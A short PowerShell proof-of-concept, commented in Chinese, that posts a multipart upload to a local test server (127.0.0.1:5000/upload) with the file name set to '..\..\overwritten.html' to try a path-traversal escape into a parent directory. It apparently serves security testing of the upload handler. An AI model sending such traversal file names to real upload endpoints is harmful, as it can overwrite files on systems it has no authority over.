# 用 Invoke-RestMethod 构造 multipart 表单，显式传恶意文件名
$File = Get-Item .\poc.html
$Form = @{
  file = $File
  name = "..\..\overwritten.html"  # 尝试逃逸到项目上级目录
}
Invoke-RestMethod -Uri http://127.0.0.1:5000/upload -Method Post -Form $Form